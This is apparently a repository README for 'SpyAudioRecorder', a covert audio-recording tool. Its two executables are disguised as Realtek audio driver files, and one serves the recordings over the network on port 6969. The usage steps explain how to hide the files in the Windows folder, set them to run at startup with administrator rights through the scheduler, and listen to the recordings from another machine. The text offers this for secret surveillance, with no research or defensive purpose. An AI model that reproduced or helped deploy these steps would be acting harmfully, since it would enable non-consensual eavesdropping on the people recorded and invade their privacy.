# SpyAudioRecorder

A secret audio recorder that you can place on the computer within your network

Realtek.exe => Simple server served on port 6969 used to access recordings
Realtek Audio Driver.exe => The recorder itself maintains recordings of 24 hours

Usage:
1) Copy both exe files somewhere in the Windows folder hidden from the plain view
2) Setup Windows scheduler to run both files when the Windows start with administrator privileges
3) Note the Local IP of the computer through Command Prompt
4) Use another computer on the network to access the recordings through browser [IP]:6969 | replace IP with the local IP
5) Enjoy